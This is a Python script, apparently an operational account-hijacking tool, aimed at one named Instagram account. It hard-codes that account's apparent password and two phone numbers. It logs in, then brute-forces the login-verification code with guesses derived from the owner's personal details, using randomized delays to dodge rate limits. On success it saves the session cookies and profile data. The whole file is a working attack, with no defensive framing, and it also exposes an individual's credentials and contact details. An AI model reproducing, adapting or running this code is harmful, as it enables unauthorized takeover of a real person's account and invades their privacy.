from utils.error_handler import safe_execution, safe_print

#!/usr/bin/env python3
"""
🔥 ENHANCED BRIGHTDATA GHOST HIJACKER 🔥
=========================================

Target: alx.trading
Enhanced with fallback systems and error handling
"""

import requests
import json
import time
import random
import re
import uuid
from datetime import datetime


class EnhancedBrightDataGhost:
    def __init__(self):
        self.target_username = "alx.trading"
        self.target_password = "Fleming654"
        self.phone_th = "0615414210"
        self.phone_uk = "+447793127209"
        
        # Fallback session without proxy first
        self.session = requests.Session()
        self.csrf_token = None
        
        # Known checkpoint
        self.known_checkpoint = "/challenge/ASjy4LfL_rtNSy_oOfH6nIhxqiOJw__TzQG72a3w6pPi5MafMfK2I2aiTYT8jAxmghHZ/AST972qvP0lMwEA2-SjYGdCnmB58hWWuru8iO4rrd2ZyG4OpWiSkf2eK44MDePumcskTgdg74laX3Q/"
        
        # Enhanced user agents
        self.user_agents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
            'Instagram 308.0.0.16.113 Android (30/11; 450dpi; 1080x2400; samsung; SM-G991B; o1s; exynos2100; en_US; 487741490)',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
        ]
        
        # Setup default headers
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,th;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
    
    def setup_fallback_proxy(self):
        """Setup simple proxy or no proxy for testing"""
        print("🌐 SETTING UP FALLBACK CONNECTION...")
        
        try:
            # Test direct connection first
            test_response = self.session.get('https://httpbin.org/ip', timeout=10)
            if test_response.status_code == 200:
                ip_data = test_response.json()
                print(f"✅ Direct connection: {ip_data.get('origin', 'Unknown IP')}")
                return True
        except Exception as e:
            print(f"❌ Connection test failed: {e}")
            return False
    
    def ghost_token_harvest(self):
        """Quick ghost token harvesting"""
        print("👻 GHOST TOKEN HARVESTING...")
        
        try:
            # Get Instagram login page
            response = self.session.get("https://www.instagram.com/accounts/login/")
            
            if response.status_code == 200:
                # Extract CSRF token
                csrf_match = re.search(r'"csrf_token":"([^"]+)"', response.text)
                if csrf_match:
                    self.csrf_token = csrf_match.group(1)
                    print(f"✅ CSRF Token harvested: {self.csrf_token[:15]}...")
                    
                    # Also try from cookies
                    if 'csrftoken' in self.session.cookies:
                        cookie_csrf = self.session.cookies['csrftoken']
                        print(f"✅ Cookie CSRF: {cookie_csrf[:15]}...")
                        self.csrf_token = cookie_csrf
                    
                    return True
                else:
                    print("❌ No CSRF token found")
            else:
                print(f"❌ Login page error: {response.status_code}")
                
        except Exception as e:
            print(f"❌ Token harvest error: {e}")
            
        return False
    
    def ghost_login_attempt(self):
        """Ghost login attempt to trigger checkpoint"""
        print("🔐 GHOST LOGIN ATTEMPT...")
        
        if not self.csrf_token:
            print("❌ No CSRF token available")
            return False
        
        try:
            # Prepare login data
            login_data = {
                'username': self.target_username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{self.target_password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            
            # Headers for login
            headers = {
                'X-CSRFToken': self.csrf_token,
                'X-Instagram-AJAX': str(random.randint(1000000000, 9999999999)),
                'X-IG-App-ID': '936619743392459',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': 'https://www.instagram.com/accounts/login/',
                'Origin': 'https://www.instagram.com'
            }
            
            self.session.headers.update(headers)
            
            # Attempt login
            login_response = self.session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                allow_redirects=False
            )
            
            print(f"📊 Login response: {login_response.status_code}")
            
            # Check response
            if login_response.status_code == 400:
                try:
                    response_data = login_response.json()
                    print(f"📋 Response data: {response_data}")
                    
                    if 'checkpoint_required' in response_data.get('message', ''):
                        checkpoint_url = response_data.get('checkpoint_url', self.known_checkpoint)
                        print(f"🎯 Checkpoint triggered: {checkpoint_url}")
                        return checkpoint_url
                    elif response_data.get('authenticated') == True:
                        print("🎉 LOGIN SUCCESS! No checkpoint required!")
                        return "SUCCESS"
                        
                except json.JSONDecodeError:
                    print("❌ Invalid JSON response")
                    
            return self.known_checkpoint  # Fallback to known checkpoint
            
        except Exception as e:
            print(f"❌ Login attempt error: {e}")
            return False
    
    def ghost_checkpoint_bypass(self, checkpoint_url):
        """Enhanced ghost checkpoint bypass"""
        print("👻 GHOST CHECKPOINT BYPASS...")
        
        if checkpoint_url == "SUCCESS":
            return self.extract_success_data()
            
        try:
            checkpoint_full_url = f"https://www.instagram.com{checkpoint_url}"
            
            # Access checkpoint page
            checkpoint_response = self.session.get(checkpoint_full_url)
            print(f"📄 Checkpoint access: {checkpoint_response.status_code}")
            
            if checkpoint_response.status_code != 200:
                print("❌ Cannot access checkpoint")
                return False
            
            # Select phone verification
            choice_data = {'choice': '0'}
            
            headers = {
                'X-CSRFToken': self.csrf_token,
                'X-Instagram-AJAX': str(random.randint(1000000000, 9999999999)),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': checkpoint_full_url
            }
            
            self.session.headers.update(headers)
            
            phone_response = self.session.post(checkpoint_full_url, data=choice_data)
            print(f"📱 Phone selection: {phone_response.status_code}")
            
            if phone_response.status_code == 200:
                return self.ultra_smart_bruteforce(checkpoint_full_url)
            
        except Exception as e:
            print(f"❌ Checkpoint bypass error: {e}")
            
        return False
    
    def ultra_smart_bruteforce(self, checkpoint_url):
        """Ultra-smart code bruteforce with enhanced intelligence"""
        print("🧠 ULTRA-SMART BRUTEFORCE...")
        
        # Enhanced smart codes
        ultra_codes = [
            # Today's date variants
            '260525', '250525', '270525', '052625', '250526',
            
            # Phone intelligence
            '061541', '615414', '414210', '154142',  # Thai phone
            '447793', '793127', '127209', '477931',  # UK phone
            
            # Fleming654 intelligence
            '654654', '654321', '654000', '654123', '654456',
            '654147', '654258', '654369', '654789',
            
            # ALX trading intelligence
            '786786', '786654', '654786', '786123', '172817',
            '786260', '786250', '260786', '250786',
            
            # Combined patterns
            '061654', '447654', '172654', '260654',
            '654061', '654447', '654172', '654260',
            
            # Business dates
            '050525', '202525', '052025', '260524',
            
            # Common with personal touch
            '123654', '456654', '789654', '000654',
            '654123', '654456', '654789', '654000',
            
            # Fallback commons
            '123456', '654321', '000000', '111111', '999999'
        ]
        
        print(f"🎯 Testing {len(ultra_codes)} ultra-smart codes...")
        
        for i, code in enumerate(ultra_codes):
            print(f"🧠 Testing {i+1}/{len(ultra_codes)}: {code}")
            
            try:
                verify_data = {
                    'security_code': code,
                    'choice': '0'
                }
                
                headers = {
                    'X-CSRFToken': self.csrf_token,
                    'X-Instagram-AJAX': str(random.randint(1000000000, 9999999999)),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Referer': checkpoint_url
                }
                
                self.session.headers.update(headers)
                
                verify_response = self.session.post(checkpoint_url, data=verify_data)
                
                print(f"   📊 Response: {verify_response.status_code}")
                
                # Success detection
                if verify_response.status_code == 302:
                    location = verify_response.headers.get('Location', '')
                    if 'instagram.com' in location and 'challenge' not in location:
                        print(f"🎉 SUCCESS! Code {code} worked!")
                        return self.extract_success_data(code)
                
                elif verify_response.status_code == 200:
                    response_text = verify_response.text.lower()
                    
                    # Check for success indicators
                    if 'challenge' not in response_text and any(indicator in response_text for indicator in ['feed', 'home', 'profile', 'instagram.com/']):
                        print(f"🎉 POSSIBLE SUCCESS with {code}!")
                        return self.extract_success_data(code)
                    
                    # Check for specific errors
                    if any(error in response_text for error in ['incorrect', 'invalid', 'wrong']):
                        print(f"   ❌ Code {code} rejected")
                    else:
                        print(f"   🔄 Code {code} unclear response")
                
                # Smart delay with randomization
                base_delay = 2.5
                jitter = random.uniform(0.5, 2.0)
                total_delay = base_delay + jitter
                print(f"   ⏳ Waiting {total_delay:.1f}s...")
                time.sleep(total_delay)
                
            except Exception as e:
                print(f"   ❌ Code {code} error: {e}")
                time.sleep(1)
        
        print("❌ All ultra-smart codes failed")
        return False
    
    def extract_success_data(self, successful_code=None):
        """Extract data after successful bypass"""
        print("🎉 EXTRACTING SUCCESS DATA...")
        
        try:
            # Test main Instagram access
            main_response = self.session.get("https://www.instagram.com/")
            
            success_data = {
                'timestamp': datetime.now().isoformat(),
                'target': self.target_username,
                'method': 'enhanced_ghost_bypass',
                'successful_code': successful_code,
                'success': True,
                'cookies': dict(self.session.cookies),
                'user_agent': self.session.headers.get('User-Agent')
            }
            
            # Try to get profile data
            try:
                profile_response = self.session.get(f"https://www.instagram.com/{self.target_username}/")
                if profile_response.status_code == 200:
                    # Look for JSON data
                    json_match = re.search(r'window\._sharedData = ({.*?});', profile_response.text)
                    if json_match:
                        import json
                        shared_data = json.loads(json_match.group(1))
                        success_data['profile_data'] = shared_data
                        print("✅ Profile data extracted")
            except:
                print("⚠️ Profile data extraction failed")
            
            # Save success data
            timestamp = int(time.time())
            filename = f"ENHANCED_GHOST_SUCCESS_{successful_code or 'unknown'}_{timestamp}.json"
            
            with open(filename, 'w') as f:
                json.dump(success_data, f, indent=2)
            
            print(f"💎 Success data saved: {filename}")
            if successful_code:
                print(f"🔑 Successful code: {successful_code}")
            
            return True
            
        except Exception as e:
            print(f"❌ Data extraction error: {e}")
            return False
    
    def run_enhanced_ghost_attack(self):
        """Execute enhanced ghost attack"""
        print("🔥 ENHANCED BRIGHTDATA GHOST ATTACK")
        print("=" * 50)
        print(f"🎯 Target: {self.target_username}")
        print(f"🔐 Password: {self.target_password}")
        print(f"👻 Method: Enhanced Ghost Mode")
        print("=" * 50)
        
        # Phase 1: Setup connection
        print("\n🌐 PHASE 1: CONNECTION SETUP")
        if not self.setup_fallback_proxy():
            print("❌ Connection setup failed")
            return False
        
        # Phase 2: Ghost token harvesting
        print("\n👻 PHASE 2: GHOST TOKEN HARVESTING")
        if not self.ghost_token_harvest():
            print("❌ Token harvesting failed")
            return False
        
        # Phase 3: Ghost login to trigger checkpoint
        print("\n🔐 PHASE 3: GHOST LOGIN TRIGGER")
        checkpoint_url = self.ghost_login_attempt()
        if not checkpoint_url:
            print("❌ Login trigger failed")
            return False
        
        # Phase 4: Ghost checkpoint bypass
        print("\n👻 PHASE 4: GHOST CHECKPOINT BYPASS")
        if self.ghost_checkpoint_bypass(checkpoint_url):
            print("🎉 ENHANCED GHOST ATTACK SUCCESSFUL!")
            print("💎 alx.trading account compromised!")
            return True
        else:
            print("❌ Ghost bypass failed")
            return False


if __name__ == "__main__":
    print("🔥 ENHANCED BRIGHTDATA GHOST HIJACKER")
    print("=" * 45)
    
    ghost = EnhancedBrightDataGhost()
    success = ghost.run_enhanced_ghost_attack()
    
    if success:
        print("\n🎉 ULTIMATE GHOST SUCCESS!")
        print("💎 Full access achieved!")
        print("👻 Ghost mode = UNSTOPPABLE!")
    else:
        print("\n⚠️ GHOST ATTACK FAILED")
        print("🔄 Retry with different timing/approach")
    
    print("\n🔥 SugarGlitch RealOps - Ghost Ops Elite")
